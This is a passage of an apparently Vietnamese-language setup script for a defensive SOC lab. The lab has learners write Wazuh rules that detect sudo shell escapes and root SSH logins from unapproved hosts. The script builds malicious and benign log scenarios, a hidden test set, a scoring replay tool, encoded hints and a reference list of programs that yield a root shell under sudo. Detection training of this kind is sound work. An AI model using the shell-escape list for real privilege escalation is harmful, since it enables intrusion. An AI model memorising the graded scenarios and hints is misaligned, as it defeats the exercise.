        progs = [R.choice(["/usr/bin/awk", "/usr/bin/find"]), R.choice(GTFO_HIDDEN_EXTRA),
                 R.choice(["/usr/bin/less", "/usr/bin/vi"])]
        mal2 = [(progs[0], emp()), (progs[1], emp()), (progs[2], emp()), (R.choice(EDITORS), "deploy")]
    for prog, user in mal2:
        add("l2", "mal", "%s:%s" % (user if user == "deploy" else "user", prog.rsplit("/", 1)[1]), l2_mal(prog, user))
    for v in ["approved", "approved", "list", "deploy-approved-repeat", "admin", "approved"]:
        add("l2", "benign", v, l2_benign(v))

    # L3
    mal3 = ["internal-key", "retired-admin", "password"] + (["external-key"] if kind == "hidden" else [])
    for v in mal3:
        add("l3", "mal", v, l3_mal(v))
    for v in ["admin", "admin", "user-key", "deploy-key", "root-fail"]:
        add("l3", "benign", v, l3_benign(v))
    return out


# ------------------------------------------------------------------ bat bien
def _parse(line):
    """Tra ve (kind, user, ip) cho dong sshd; None neu khong phai."""
    import re
    m = re.search(r"(Failed|Accepted) (password|publickey) for (\S+) from (\S+)", line)
    if not m:
        return None
    return ("fail" if m.group(1) == "Failed" else "ok"), m.group(3), m.group(4)


def check(scs):
    errs = []
    for s in scs:
        if s["family"] == "l1":
            by_ip = {}
            for ln in s["lines"]:
                p = _parse(ln)
                if p and p[0] == "fail":
                    by_ip.setdefault(p[2], set()).add(p[1])
            mx = max([len(v) for v in by_ip.values()] or [0])
            if s["label"] == "mal" and mx < 8:
                errs.append("%s: doc nhung chi %d tai khoan/IP" % (s["id"], mx))
            if s["label"] == "benign" and mx > 3:
                errs.append("%s: lanh nhung %d tai khoan khac nhau tu 1 IP" % (s["id"], mx))
            if s["variant"] in ("typo", "repeat", "stale"):
                fails = [_parse(l) for l in s["lines"] if "Failed" in l]
                if len({f[1] for f in fails}) != 1 or (s["variant"] == "typo" and len(fails) > 4) \
                        or (s["variant"] != "typo" and len(fails) < 5):
                    errs.append("%s: typo <=4 lan; repeat/stale >=5 lan; luon cung 1 user" % s["id"])
        if s["family"] == "l2" and s["label"] == "mal":
            if not any("COMMAND=" + c.split(" ")[0] in ln or ("COMMAND=" + c) in ln for ln in s["lines"] for c in GTFO_CMD):
                errs.append("%s: khong co lenh thoat shell" % s["id"])
        if s["family"] == "l3":
            roots = [_parse(l) for l in s["lines"] if _parse(l) and _parse(l)[0] == "ok" and _parse(l)[1] == "root"]
            bad = [r for r in roots if r[2] not in ADMIN_APPROVED]
            if s["label"] == "mal" and not bad:
                errs.append("%s: doc nhung khong co root dang nhap tu IP khong duyet" % s["id"])
            if s["label"] == "benign" and bad:
                errs.append("%s: lanh nhung co root tu IP khong duyet" % s["id"])
    fams = {}
    for s in scs:
        fams.setdefault((s["family"], s["label"]), 0)
        fams[(s["family"], s["label"])] += 1
    if not any(s["family"] == "l2" and s["label"] == "mal" and s["variant"].startswith("deploy:") for s in scs):
        errs.append("l2: thieu kich ban doc do chinh deploy chay chuong trinh khong duoc duyet")
    if not any(s["family"] == "l3" and s["variant"] == "retired-admin" for s in scs):
        errs.append("l3: thieu kich ban tu may quan tri da retired")
    return errs, fams


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--set", choices=["dev", "hidden"])
    ap.add_argument("--out")
    ap.add_argument("--seed", type=int)
    ap.add_argument("--check")
    a = ap.parse_args()
    if a.check:
        scs = [json.loads(l) for l in open(a.check) if l.strip()]
        errs, fams = check(scs)
        print("SO_KICH_BAN " + " ".join("%s/%s=%d" % (k[0], k[1], v) for k, v in sorted(fams.items())))
        for e in errs:
            print("LOI " + e)
        sys.exit(1 if errs else 0)
    if not a.set or not a.out:
        ap.error("can --set va --out (hoac --check)")
    R.seed(a.seed if a.seed is not None else int.from_bytes(__import__("os").urandom(8), "big"))
    for _ in range(10):
        scs = build(a.set)
        errs, _f = check(scs)
        if not errs:
            break
    else:
        print("\n".join(errs)); sys.exit(2)
    with open(a.out, "w") as f:
        for s in scs:
            f.write(json.dumps(s) + "\n")
    print("OK %d kich ban -> %s" % (len(scs), a.out))


if __name__ == "__main__":
    main()
__EOF_LAB_SOC_PRIVESC__
mkdir -p "$LAB/defender/bai17"
cat > "$LAB/defender/bai17/goiy-bai17.dat" <<'__EOF_LAB_SOC_PRIVESC__'
eNp1WG1v2lwS/Z5fMUKrDWzBhpC0K0JYUaDBSgJZXrpP1W7RxXbAT4wv9UsaVo/62/fMXBtI2laqAvjO3LlnzpyZ688N6+y/J6Nhd0Qf5/TRGfSo7KotnVVOajSL/Yg8layXWsVelULtUpyFvhX6T35InStq1Mlda1IrP0opVfHKx59YRyt6XGuFP+laB7QKVESuwpPMteD3eh1QqIIWbdSuiqe6Ci8Z1vpUTlVgbG3nvkJupmAYrWmpNHnaor7awZRKLpZ5mQ5KlsSZIbJHePUCH35iBa/8LYMNtn6C8Q/by2r8zUqfUypjC0TnrtUGq/ApUUHFOjn53LCav4KjyXD09oFkO4rWKiVNm8xFgJpj2kdOc6dPddpoCdHFA01lYBCYaNg6jXk7RM4RtijMAnryaTaZj7Hhow8TAMYRcuhLBnIVVCnNsNKlSOkKHlAaID0wm3bniBJIJQrulNlUTgVUlRzrjLM8c+4Gt85oQH+n6zG9H7/ItAQaIzT81pJMqyxdW6FekX3gAOdIk3NPRzFW2ZUA/8gBldI148RPSpcnRJ6/oURTlvgx3Qy7PQK6c1oGcJWZ5AVYnqi0RUnmaUkcuBLCe7TKBEOc5NYZzOhmQN+ynR9VqUhfIOuQRrDCj9biT5jEh/jg3DH1Nuyc7HSzvQRkG3oIQl+S85zh9zXHfO3Mu3CgjXvGlvm19eMkSFI/cn0LBxmt+YxijT0PxjFcLfnDBr/UzAJwVvZKEeGTwUm8aoqKE0UctKs2HPO/M6E1KsJT5tGWDjBKFUzG4xkT4DX223Wmpc5AjJvheHSNXxA7x/K4VoJwT7lrCne8u2EFCvRPvTQg/ksAW+VhckwbVcCr+ExYIgRq/o5AUhv8aDG9n3Q/Ef+7otMPCkB4tFVJ8l3H3in1kfaZMxjxKRrvwMi6VbcuCtturzeYTnPbruv62/TImh50TP5ma1kWPcR6c+TgFJhlUguFq74z7Y0/Diaf4MrjgwivGMRDiYJ/YA+oCVB647u77qh/FSLZhY/BtNe97c6c8ejYB29frLazJLaXQWSr74/7sxXmvcmgTzkSTMNT5Xk+MDDayFxs7Zl0TApoIT/3U9dO1srT3wuH94PJ1JnODDyR/13qqQUp2PhXyZNbQ2SnxdrJYDCaTT69hjJbhoH76O8Ey1jr9Cck4WA6Xsy6zgJM6o4W751FfwwnRfmCUC6TM+OYf0qwvd/rlFNsXeSn9bCTp1FA5ZkzGlKv+4s0iBjeObPJACWg9+ylRqNRr0plcjmsqHFx/s8qk11KHO2n3qwWgorFzbdVlLCpJTw8a0i3gYJCYyMYhWpJK0hb+YxFEv72NV+lc4je9rjmRWUU0NJoYqFXoTf0x7jLaoyY/S2ZBLG6Nlld36NnAK374RzlcTvvzo7k9T3LvuZabdETcr0xTdE0hN/0VQOeyLo+aqNHfUQwFQ1kLRpdzz+huGaTLjSgxlqe90QOOEIksor9bSC4Avhto2V+ZTlJ5AN3/KRQ8hdilMJRULoUPT8k8KDoSHlvjq0bkCgE9iL8ftehsuEB1AsyBPtI5BSQpCaWs5bEnJeatY31KoZ2lzlnKStYoqKKdDTqz1nn+gDczdWPe0jRFR45QG7siWbZ/gNff9iIuBZiQ3uVPmhUbVKTXTALWDRaacSDYhTllA7X694L5WvHG0iYzWONnk6Hr3WaC+sSnSt3ecUzjkw34GUkNO2NRzR0BnOQpMcu+1z4p+B0TYSm1JY/aLydErTNp2c+j0EmkuFDRgoAckjxU4C5izMpIXIiI+SvHDwskgDEPeoL+fyAUPdqwwXdov3+G0nTsWpK7feGaJEprACptAl5zD2tWNHvmgfcD1Fg3JhDphGkeSusr9WS1AuQxFqHSZEwboFnGBhJrmYG7KxqDs3Ge6bxPiauZO2x8GH6OoKlnMSuhMEheEnKnyumOJu/Lc7m6+LkajpU2AXr3H78NGWJ2KW5LC6uGlXp66w19aKc2lzHEFb/WwYN2V2VLko8CPgPMSt16W29XupASNpIDUQOOuJxijoX797W2/arH09MB+HlCawXOGGwtcXcCx4efNRquuBz2h3WSJaORr3WOKsaJaUZq6cFibQKT+WP3GgKEKuvEH6BaQ4hn/dotxxkBMEyMO06ViWvXaHDcS1oGqLqw5yMLbo4r58xX/C3SeUS04Mbt2yyJ1SpmpM1VIItJ50NK/sjYAinM+M2PzLOy3oqPzXIcJ7Ksp0tu1WqQvfCQ5v7PLqvH3pXpWOtKaHo9GO2vSpJFhbolaUOt2I2SEQ5asnaD8O2/NI54Iyu9ALnO80z7NYM4zvUJqiT6y8TRuJGX2ubYDt4jIk3PxVLsEjZFowFErPh2Cn8cr4EMNHpQieo3I79lf9M6W4Ljm3d2D8rdcpf//qSVDx/G+rdl6T1JWnbsqrDd4c9FgKDGSNeYtH5uh9wkh0a4sZNw7+1bVnfsaj8H/W/bJ0ny9Vyd2vn7OiAFLn/PgvAATgjnaXj0alVKmS1QOPiXeNCakGgAdnF51cWVgQgX+jNr5PJBXLIYqTTBeau2E+SxS8zqjy0wtpa43OR0sLvgVtFjnmaqNfPLTqyEr2QloSxPEkVSuZKbQHhk4/qMofdz1fnDT7ryedznhaG3Ul/MHIA3mFKMH1oGaQ0xQ2ySrdBlD2bMtA8cgilzA1lNhyMacbtFg2YRtzy+R4uI6VcBfjiwZ7VMggDKHBSMfeMHbcOU6ym3EfSitgQl2ttxrFMhN7wi4X7h80GNU/VhM2WmzyxNxFihMYdI+WbI9ovxcj4SoI5tMmiL5rTN386vcgwXh3w51qMqj3r2J7/ZEcZKMMKtL+2iR5vF4mfZoF3iVnOXI6TvW2bl3U4Ou77ZpBG7JjqLM/+R4ueMdFNMKhfv+pxpk4oxWlTcyFlRYSeaZtbEXvlyywuirlhURMEeuHFR7qvdYtuMNDmglgLqTbPnXNQJqBkzf+9BVL7EKxadO/HmyCdAKFbvQogxPrSTGygAy+85HmscCmo12b0F61iNNaa3FNhbgCmvCQlyK3cT3lIkQ+s9IeZgV0e5UhFKsSZhG48YnCuLsxcO8Y4NCZnckTVjzxwcJKXZiSFJ+22hFuycxmvXnjckta85Fv6DiqMMcVlnEK1yb/wFfOboAanHzjDZqrObTj3LlJyN3YOdwLRPp6q2BPGBoTZ/DnMpqkoqRYcMJK5H10Fc8zYaR287RBkecldkQd8Rtjm6uMXQoguA3IgwxtzXzqgJayDmnDYN2uzCV5c8OUlOIpUrjj6SLLlhVfMMzHWSDo99v+44zdg5j0IBrvCgc19mSXJA0Obpj1wq+OXQpI+uQjtMxry7J6/mrBO/g/2rkAC
__EOF_LAB_SOC_PRIVESC__
mkdir -p "$LAB/defender/bai17"
cat > "$LAB/defender/bai17/gtfobins-sudo.txt" <<'__EOF_LAB_SOC_PRIVESC__'
TAI LIEU THAM KHAO OFFLINE - Chuong trinh co the "thoat ra shell" khi duoc chay bang sudo
(tom tat theo danh muc cong khai GTFOBins: https://gtfobins.github.io - lab khong co Internet)
-----------------------------------------------------------------------------------------------
Nguyen tac: neu mot chuong trinh co the chay lenh khac, mo trinh soan thao, mo pager, hoac
thuc thi ma -> chay no bang sudo = co shell root. Danh sach duoi CHUA DAY DU.

Trinh thong dich / ngon ngu : python, python3, perl, ruby, lua, php, node, tclsh, irb, expect
Cong cu xu ly van ban      : awk, gawk, mawk, sed (voi lenh e), ed
Tim kiem / he thong file   : find, tar, zip, rsync, cp (ghi de file he thong)
Trinh soan thao            : vi, vim, vim.tiny, view, nano, pico, emacs
Pager / xem file           : less, more, man, journalctl, systemctl (qua pager)
Shell / bien moi truong    : sh, bash, dash, env, script, nohup, xargs, time, timeout
Mang / ket noi             : ssh (ProxyCommand), ftp, socat, nmap (script), tcpdump (-z)
Quan ly goi / dev          : apt, apt-get (changelog qua pager), git (pager/hook), gdb, make
-----------------------------------------------------------------------------------------------
Luu y van hanh: mot so chuong trinh trong danh sach VAN duoc cap sudo vi ly do cong viec
(vd systemctl cho deploy). Do la RUI RO DUOC CHAP NHAN CO GHI NHAN (xem sudo-da-duyet.csv),
khong phai "an toan". Luat phat hien phai ngoai le DUNG CAP user-lenh da duyet, khong ngoai le
ca user.
__EOF_LAB_SOC_PRIVESC__
mkdir -p "$LAB/defender/bai17"
cat > "$LAB/defender/bai17/sudo-da-duyet.csv" <<'__EOF_LAB_SOC_PRIVESC__'
user,chuong_trinh,tham_so,ly_do
deploy,/usr/bin/systemctl,restart nginx,Trien khai ban moi cho web
deploy,/usr/bin/systemctl,restart cron,Nap lai lich tac vu sau trien khai
adminops,/usr/bin/apt,update,Cap nhat danh muc goi hang tuan
adminops,/usr/bin/tail,-n 200 /var/log/syslog,Xem log khi truc
__EOF_LAB_SOC_PRIVESC__
mkdir -p "$LAB/defender/soc-tools"
cat > "$LAB/defender/soc-tools/goi-y" <<'__EOF_LAB_SOC_PRIVESC__'
#!/usr/bin/env python3
# ============================================================================
# goi-y <pha> <cap>   - in goi y cap 2/3 cua bai dang lam va GHI NHAT KY (~/.goi-y.log).
# goi-y               - liet ke cac goi y co san.
# Ha tang DUNG CHUNG (Bai 14-18). Goi y cap 1 nam trong read_first.txt.
#
# Noi dung luu o /usr/local/share/goi-y/<bai>.dat (zlib + base64 - chi de tranh "lo mat doc",
# khong phai bao mat). <bai> lay tu "goiy" trong /etc/soc-tools/lab.json.
# Tac gia: tao .dat tu file nguon bang:  goi-y --encode bai17.txt bai17.dat
#   File nguon: cac khoi bat dau bang dong "[<pha>.<cap>]" (vd [2.3]), ASCII.
# ============================================================================
import base64, json, os, pwd, sys, time, zlib

CONF = "/etc/soc-tools/lab.json"
DATA_DIR = "/usr/local/share/goi-y"


def home():
    u = os.environ.get("SUDO_USER")
    return pwd.getpwnam(u).pw_dir if u else os.path.expanduser("~")


def parse(text):
    blocks, key, buf = {}, None, []
    for ln in text.splitlines():
        s = ln.strip()
        if s.startswith("[") and s.endswith("]") and "." in s:
            if key:
                blocks[key] = "\n".join(buf).strip()
            key, buf = s[1:-1], []
        elif key:
            buf.append(ln)
    if key:
        blocks[key] = "\n".join(buf).strip()
    return blocks


def load():
    bai = json.load(open(CONF)).get("goiy", "bai")
    raw = open(os.path.join(DATA_DIR, bai + ".dat"), "rb").read()
    return bai, parse(zlib.decompress(base64.b64decode(raw)).decode("utf-8"))


def main():
    a = sys.argv[1:]
    if len(a) == 3 and a[0] == "--encode":
        src = open(a[1], encoding="utf-8").read()
        open(a[2], "wb").write(base64.b64encode(zlib.compress(src.encode("utf-8"), 9)))
        print("Da ghi %s (%d khoi)" % (a[2], len(parse(src))))
        return
    try:
        bai, blocks = load()
    except Exception as e:
        print("Khong doc duoc du lieu goi y: %s" % e)
        sys.exit(1)
    if len(a) != 2:
        print("Dung: goi-y <pha> <cap>   (cap 2 = chi cho, cap 3 = gan nhu loi giai)")
        print("Goi y cap 1 nam trong read_first.txt. Cac goi y co san:")
        for k in sorted(blocks):
            print("  goi-y %s %s" % tuple(k.split(".", 1)))
        return
    key = "%s.%s" % (a[0], a[1])
    if a[1] == "1":
        print("Goi y cap 1 nam trong read_first.txt.")
        return
    if key not in blocks:
        print("Khong co goi y '%s'. Chay 'goi-y' de xem danh sach." % key)
        sys.exit(1)
    try:
        with open(os.path.join(home(), ".goi-y.log"), "a") as f:
            f.write("%s %s pha=%s cap=%s\n" % (time.strftime("%Y-%m-%d %H:%M:%S"), bai, a[0], a[1]))
    except OSError:
        pass
    print(blocks[key])


if __name__ == "__main__":
    main()
__EOF_LAB_SOC_PRIVESC__
mkdir -p "$LAB/defender/soc-tools"
cat > "$LAB/defender/soc-tools/kiem-thu-luat" <<'__EOF_LAB_SOC_PRIVESC__'
#!/usr/bin/env python3
# ============================================================================
# kiem-thu-luat - kiem cu phap, nap luat + CDB list cua nguoi hoc len Wazuh, khoi dong lai
# manager, roi phat lai TAP PHAT TRIEN va in TP/FP/FN, precision, recall tung ho.
# Ha tang DUNG CHUNG (Bai 16, 17, 18). Cau hinh rieng tung bai: /etc/soc-tools/lab.json
#   {
#     "rules_file": "luat/local_rules.xml",        (tuong doi voi HOME nguoi hoc)
#     "lists_dir":  "luat/lists",
#     "lists":      ["gtfo-shell", "sudo-approved", "admin-hosts"],
#     "dev_set":    "dev/dev.jsonl",
#     "ranges":     "l1=100270-100279,l2=100280-100289,l3=100290-100299"
#   }
# An toan: luat loi -> KHOI PHUC ban dang chay truoc do, manager khong bi sap.
# ============================================================================
import hashlib, json, os, pwd, sys, time
import xml.etree.ElementTree as ET

HERE = os.path.dirname(os.path.realpath(__file__))
for p in (HERE, "/usr/local/lib/soc-tools"):
    if os.path.isfile(os.path.join(p, "wzapi.py")):
        sys.path.insert(0, p)
        break
from wzapi import Wazuh, WazuhError
import replay

CONF = "/etc/soc-tools/lab.json"


def user_home():
    u = os.environ.get("SUDO_USER")
    if u:
        return pwd.getpwnam(u).pw_dir
    return os.path.expanduser("~")


def die(msg, code=1):
    print("LOI: " + msg)
    sys.exit(code)


BAD_TAGS = {
    "srcuser": "khong co the nay; so ten tren dong log bang <regex type=\"pcre2\">",
    "dstuser": "dung <user>",
    "different_dstuser": "dung <different_user />",
    "same_dstuser": "khong co the nay tren Wazuh 4.14",
}
STATIC_FIELDS = {
    "srcuser": "So ten tren dong log bang <regex type=\"pcre2\">.",
    "dstuser": "Dung <user>.",
    "srcip": "Dung <srcip> hoac <list field=\"srcip\" ...>.",
    "dstip": "Dung <dstip>.",
    "user": "Dung <user>.",
}


def check_rules_xml(text, ranges):
    """Kiem cu phap XML + moi rule id phai nam trong dai duoc giao. Tra ve danh sach loi."""
    errs = []
    try:
        root = ET.fromstring("<root>" + text + "</root>")
    except ET.ParseError as e:
        return ["Cu phap XML sai: %s" % e]
    allowed = list(ranges.values())
    if not list(root.iter("rule")):
        return ["Chua co luat nao trong file (Wazuh tu choi <group> rong)"]
    # Loi da gap tren Wazuh 4.14 that (API bao chung chung "1113 XML syntax error"):
    for el in root.iter():
        if el.tag in BAD_TAGS:
            errs.append("The <%s> KHONG hop le trong luat Wazuh: %s" % (el.tag, BAD_TAGS[el.tag]))
        if el.tag == "field" and el.get("name") in STATIC_FIELDS:
            errs.append('<field name="%s"> KHONG dung duoc: %s la truong TINH. %s'
                        % (el.get("name"), el.get("name"), STATIC_FIELDS[el.get("name")]))
    for rule in root.iter("rule"):
        rid = rule.get("id", "")
        if not rid.isdigit():
            errs.append("Luat thieu id hoac id khong phai so: %r" % rid)
            continue
        n = int(rid)
        if not any(lo <= n <= hi for lo, hi in allowed):
            errs.append("Luat id=%d nam NGOAI dai ID duoc giao" % n)
        lvl = rule.get("level", "")
        if lvl.isdigit() and int(lvl) >= 10 and rule.find("mitre") is None:
            errs.append("Luat id=%d level %s thieu <mitre>" % (n, lvl))
    return errs


def main():
    if not os.path.isfile(CONF):
        die("khong thay %s (lab chua cai cong cu?)" % CONF)
    cfg = json.load(open(CONF))
    home = user_home()
    rules_path = os.path.join(home, cfg["rules_file"])
    lists_dir = os.path.join(home, cfg["lists_dir"])
    dev_set = os.path.join(home, cfg["dev_set"])
    ranges = replay.parse_ranges(cfg["ranges"])

    print("== 1) Kiem tra cuc bo: %s" % rules_path)
    if not os.path.isfile(rules_path):
        die("khong thay file luat %s" % rules_path)
    text = open(rules_path, encoding="utf-8").read()
    errs = check_rules_xml(text, ranges)
    hard = [e for e in errs if "thieu <mitre>" not in e]
    for e in errs:
        print("   - " + e)
    if hard:
        die("sua cac loi tren roi chay lai (CHUA nap gi len Wazuh).")

    # Quy uoc phat lai: luat tan suat phai co timeframe >= window_s cua kich ban trong ho do
    # (bo phat lai gui ca cua so gan nhu cung luc nen tap kiem tra KHONG do duoc dieu nay).
    try:
        wins = {}
        for sc in replay.load_set(dev_set):
            wins[sc["family"]] = max(wins.get(sc["family"], 0), int(sc.get("window_s", 0)))
        root = ET.fromstring("<root>" + text + "</root>")
        for rule in root.iter("rule"):
            rid, tf = rule.get("id", "0"), rule.get("timeframe")
            if not (rid.isdigit() and rule.get("frequency") and tf and tf.isdigit()):
                continue
            for fam, (lo, hi) in ranges.items():
                if lo <= int(rid) <= hi and int(tf) < wins.get(fam, 0):
                    print("   - CANH BAO: luat %s (ho %s) timeframe=%s < cua so kich ban %ss -> luat se bo lo "
                          "hanh vi keo dai trong thuc te (va bi tru o cham diem)." % (rid, fam, tf, wins[fam]))
    except Exception:  # noqa: BLE001
        pass

    lists = {}
    for name in cfg.get("lists", []):
        p = os.path.join(lists_dir, name)
        lists[name] = open(p, encoding="utf-8").read() if os.path.isfile(p) else ""
        for i, ln in enumerate(lists[name].splitlines(), 1):
            if ln.strip() and ":" not in ln:
                die("CDB list %s dong %d sai dinh dang (can 'khoa:' hoac 'khoa:gia_tri'): %r" % (name, i, ln))

    api = Wazuh()
    try:
        api.login()
    except WazuhError as e:
        die(str(e) + "\n   (Wazuh co the dang khoi dong - doi 1-2 phut roi chay lai)")

    print("== 2) Sao luu luat dang chay")
    try:
        backup_rules = api.get_rule_file("local_rules.xml")
    except WazuhError:
        backup_rules = None

    print("== 3) Nap luat + %d CDB list" % len(lists))
    try:
        api.put_rule_file("local_rules.xml", text)
        for name, content in lists.items():
            api.put_list_file(name, content if content.strip() else "lab-placeholder:\n")
    except WazuhError as e:
        if backup_rules is not None:
            try:
                api.put_rule_file("local_rules.xml", backup_rules)
            except WazuhError:
                pass
        die("Wazuh tu choi file: %s" % e)
    # doc lai de chac file tren siem DUNG la file vua gui
    try:
        now = api.get_rule_file("local_rules.xml")
    except WazuhError:
        now = None
    if now is not None and now.strip() != text.strip():
        die("File luat tren siem KHAC file vua gui (co the API khong ghi duoc). Chay lai; neu van loi bao giang vien.")

    try:
        ok, msg = api.validate()
    except WazuhError as e:
        # khong kiem duoc -> KHONG de luat chua kiem tren dia (lan restart sau se nap no)
        if backup_rules is not None:
            try:
                api.put_rule_file("local_rules.xml", backup_rules)
            except WazuhError:
                pass
        die("Wazuh khong tra loi buoc kiem tra cau hinh (may dang qua tai?): %s\n"
            "   -> Da khoi phuc luat truoc do. Doi 1-2 phut roi chay lai." % str(e)[:200])
    if not ok:
        print("   Cau hinh KHONG hop le: %s" % msg)
        if backup_rules is not None:
            api.put_rule_file("local_rules.xml", backup_rules)
            print("   -> Da KHOI PHUC luat truoc do. Manager khong bi khoi dong lai.")
        sys.exit(1)

    print("== 4) Khoi dong lai Wazuh manager (~1-2 phut)")
    if not api.restart():
        die("manager chua len lai sau 4 phut - chay lai lenh nay sau 1 phut.")

    print("== 5) Phat lai tap phat trien %s" % dev_set)
    res = replay.run(replay.ApiEngine(api), replay.load_set(dev_set), ranges)
    replay.print_dev(res)

    sha = hashlib.sha256(text.encode("utf-8")).hexdigest()[:12]
    summ = " ".join("%s:P%.2f/R%.2f" % (f, r["precision"], r["recall"]) for f, r in res.items())
    try:
        with open(os.path.join(home, ".kiem-thu.log"), "a") as f:
            f.write("%s sha=%s %s\n" % (time.strftime("%Y-%m-%d %H:%M:%S"), sha, summ))
    except OSError:
        pass
    print("\nLuat dang nap tren Wazuh (sha %s) chinh la bai nop. Tap kiem tra AN khac tap nay." % sha)


if __name__ == "__main__":
    main()
__EOF_LAB_SOC_PRIVESC__
mkdir -p "$LAB/defender/soc-tools"
cat > "$LAB/defender/soc-tools/replay.py" <<'__EOF_LAB_SOC_PRIVESC__'
#!/usr/bin/env python3
# ============================================================================
# replay.py - phat lai bo kich ban log (JSONL) qua Wazuh logtest, dem TP/FP/FN theo ho luat.
# Ha tang DUNG CHUNG (Bai 16, 17, 18). Xem README.md cung thu muc.
#
# Dinh dang moi dong JSONL:
#   {"id": "l1-m-03", "family": "l1", "label": "mal"|"benign", "variant": "...",
#    "window_s": 600, "lines": ["<dong syslog 1>", "<dong syslog 2>", ...]}
#
# Quy uoc dem (theo KICH BAN, khong theo dong log):
#   - Moi kich ban = 1 phien logtest rieng (token rieng) -> luat tan suat co trang thai trong phien.
#   - Kich ban DUONG TINH neu co >= 1 dong sinh canh bao level >= MIN_LEVEL
#     voi rule.id nam trong dai ID cua ho do.
#   - mal & duong tinh = TP ; mal & am tinh = FN ; benign & duong tinh = FP.
#   - Luat im lang hoan toan: precision = 0 (quy uoc), recall = 0.
#
# Dung:
#   replay.py --set dev.jsonl --ranges l1=100270-100279,l2=100280-100289 [--mode dev|grade|json]
# ============================================================================
import argparse, json, sys

MIN_LEVEL = 10


def load_set(path):
    out = []
    with open(path, encoding="utf-8") as f:
        for ln in f:
            ln = ln.strip()
            if ln:
                out.append(json.loads(ln))
    return out


def parse_ranges(s):
    rng = {}
    for part in (s or "").split(","):
        part = part.strip()
        if not part:
            continue
        fam, span = part.split("=")
        lo, hi = span.split("-")
        rng[fam.strip()] = (int(lo), int(hi))
    return rng


def scenario_hits(engine, sc, lo, hi, min_level=MIN_LEVEL):
    """engine(event, token) -> (token, output). Tra ve danh sach (rule_id, level) da no trong dai."""
    hits = []
    token = None
    try:
        for line in sc["lines"]:
            token, out = engine(line, token)
            rule = (out or {}).get("rule") or {}
            try:
                rid = int(rule.get("id", -1))
                lvl = int(rule.get("level", 0))
            except (TypeError, ValueError):
                continue
            if lo <= rid <= hi and lvl >= min_level:
                hits.append((rid, lvl))
    finally:
        if hasattr(engine, "close"):
            engine.close(token)
    return hits


def run(engine, scenarios, ranges):
    res = {}
    for fam, (lo, hi) in ranges.items():
        r = {"tp": 0, "fp": 0, "fn": 0, "tn": 0, "fp_ids": [], "fn_ids": [], "n_mal": 0, "n_benign": 0}
        for sc in scenarios:
            if sc.get("family") != fam:
                continue
            pos = bool(scenario_hits(engine, sc, lo, hi))
            mal = sc.get("label") == "mal"
            if mal:
                r["n_mal"] += 1
                if pos:
                    r["tp"] += 1
                else:
                    r["fn"] += 1
                    r["fn_ids"].append(sc["id"])
            else:
                r["n_benign"] += 1
                if pos:
                    r["fp"] += 1
                    r["fp_ids"].append(sc["id"])
                else:
                    r["tn"] += 1
        r["precision"] = (r["tp"] / (r["tp"] + r["fp"])) if (r["tp"] + r["fp"]) else 0.0
        r["recall"] = (r["tp"] / r["n_mal"]) if r["n_mal"] else 0.0
        res[fam] = r
    return res


class ApiEngine:
    """Bo phat lai that: goi Wazuh API /logtest."""

    def __init__(self, api):
        self.api = api

    def __call__(self, event, token):
        return self.api.logtest(event, token)

    def close(self, token):
        self.api.logtest_close(token)


def print_dev(res):
    print("%-5s %4s %4s %4s  %-9s %-6s" % ("HO", "TP", "FP", "FN", "PRECISION", "RECALL"))
    for fam, r in res.items():
        print("%-5s %4d %4d %4d  %-9.2f %-6.2f" % (fam, r["tp"], r["fp"], r["fn"], r["precision"], r["recall"]))
    for fam, r in res.items():
        if r["fp_ids"]:
            print("  [%s] kich ban BAO GIA (FP): %s" % (fam, ", ".join(r["fp_ids"])))
        if r["fn_ids"]:
            print("  [%s] kich ban BO SOT (FN): %s" % (fam, ", ".join(r["fn_ids"])))


def main():
    ap = argparse.ArgumentParser(description="Phat lai kich ban log qua Wazuh logtest")
    ap.add_argument("--set", required=True, help="file JSONL kich ban")
    ap.add_argument("--ranges", required=True, help="ho=tu-den,... vd l1=100270-100279")
    ap.add_argument("--mode", default="dev", choices=["dev", "grade", "json"])
    a = ap.parse_args()

    sys.path.insert(0, __import__("os").path.dirname(__import__("os").path.abspath(__file__)))
    from wzapi import Wazuh
    res = run(ApiEngine(Wazuh()), load_set(a.set), parse_ranges(a.ranges))
    if a.mode == "dev":
        print_dev(res)
    elif a.mode == "json":
        print(json.dumps(res))
    else:
        for fam, r in res.items():
            print("%s_TP=%d %s_FP=%d %s_FN=%d" % (fam.upper(), r["tp"], fam.upper(), r["fp"], fam.upper(), r["fn"]))


if __name__ == "__main__":
    main()
__EOF_LAB_SOC_PRIVESC__
mkdir -p "$LAB/defender/soc-tools"
cat > "$LAB/defender/soc-tools/thu-dong" <<'__EOF_LAB_SOC_PRIVESC__'
#!/usr/bin/env python3
# ============================================================================
# thu-dong "<dong log>" [--location /var/log/auth.log]
# Chay MOT dong log qua Wazuh logtest voi bo luat DANG NAP. In: decoder, cac truong da tach,
# luat no (id, level, mo ta). Nhieu dong lien tiep trong cung phien: dung --stdin (moi dong 1 su kien).
# Ha tang DUNG CHUNG (Bai 16, 17, 18).
# ============================================================================
import argparse, json, os, sys

HERE = os.path.dirname(os.path.realpath(__file__))
for p in (HERE, "/usr/local/lib/soc-tools"):
    if os.path.isfile(os.path.join(p, "wzapi.py")):
        sys.path.insert(0, p)
        break
from wzapi import Wazuh, WazuhError


def show(out):
    dec = out.get("decoder") or {}
    print("  decoder : %s%s" % (dec.get("parent", "") + " > " if dec.get("parent") else "", dec.get("name", "(khong co)")))
    data = dict(out.get("data") or {})
    for k in ("srcip", "dstip", "srcuser", "dstuser", "srcport", "dstport", "url", "id", "status"):
        if k in out:
            data[k] = out[k]
    if data:
        print("  truong  : " + json.dumps(data, ensure_ascii=False))
    rule = out.get("rule") or {}
    if rule:
        mitre = ",".join((rule.get("mitre") or {}).get("id", []) or [])
        print("  luat    : id=%s level=%s %s%s" % (rule.get("id"), rule.get("level"), rule.get("description", ""),
                                             ("  [MITRE " + mitre + "]") if mitre else ""))
    else:
        print("  luat    : (khong luat nao no)")


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("line", nargs="?", help="dong log (dat trong ngoac kep)")
    ap.add_argument("--stdin", action="store_true", help="doc nhieu dong tu stdin, cung 1 phien")
    ap.add_argument("--location", default="/var/log/auth.log")
    a = ap.parse_args()
    lines = [l.rstrip("\n") for l in sys.stdin if l.strip()] if a.stdin else ([a.line] if a.line else [])
    if not lines:
        ap.error("can 1 dong log hoac --stdin")
    api = Wazuh()
    token = None
    try:
        for i, ln in enumerate(lines, 1):
            token, out = api.logtest(ln, token, location=a.location)
            print("[%d] %s" % (i, ln[:110]))
